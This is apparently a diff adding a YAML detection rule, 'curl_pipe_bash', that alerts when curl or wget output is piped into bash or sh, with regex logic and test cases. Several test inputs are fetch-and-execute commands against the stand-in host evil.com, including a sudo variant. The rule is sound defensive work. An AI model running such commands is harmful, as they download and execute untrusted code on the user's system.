@@ -1,0 +1,42 @@
+name: curl_pipe_bash
+mode: alert
+# Two cases: (1) bash -c 'curl ... | bash' — full pipeline in one process argv.
+# (2) Direct pipeline "curl URL | bash" — we only see curl with script-like URL and no -o.
+eval: |
+  (
+    (e.process_name == "bash" || e.process_name == "sh") &&
+    re_match(e.process_args, "(curl|wget)\\s+.*\\|\\s*(sudo\\s+)?(bash|sh)")
+  ) || (
+    (e.process_name == "curl" || e.process_name == "wget") &&
+    re_match(e.process_args, "https?://[^\\s]+\\.sh(\\s|$)") &&
+    !re_match(e.process_args, "\\s(-o|--output|-O)(\\s|$)")
+  )
+tests:
+  - cleartext: "bash -c 'curl http://evil.com/payload.sh | bash'"
+    process_name: bash
+    process_args: "bash -c curl http://evil.com/payload.sh | bash"
+    should_match: true
+  - cleartext: "wget -qO- http://evil.com/setup.sh | sh"
+    process_name: sh
+    process_args: "sh -c wget -qO- http://evil.com/setup.sh | sh"
+    should_match: true
+  - cleartext: "curl http://evil.com/payload.sh | bash (direct pipeline — curl process)"
+    process_name: curl
+    process_args: "curl http://evil.com/payload.sh"
+    should_match: true
+  - cleartext: "curl http://evil.com/install.sh | sudo bash (direct — curl process)"
+    process_name: curl
+    process_args: "curl http://evil.com/install.sh"
+    should_match: true
+  - cleartext: "curl http://example.com/readme.txt -o readme.txt (download to file)"
+    process_name: curl
+    process_args: "curl http://example.com/readme.txt -o readme.txt"
+    should_match: false
+  - cleartext: "curl http://example.com/page.html (not a .sh URL)"
+    process_name: curl
+    process_args: "curl http://example.com/page.html"
+    should_match: false
+  - cleartext: "curl http://example.com/script.sh -o /tmp/script.sh (saving to file)"
+    process_name: curl
+    process_args: "curl http://example.com/script.sh -o /tmp/script.sh"
+    should_match: false
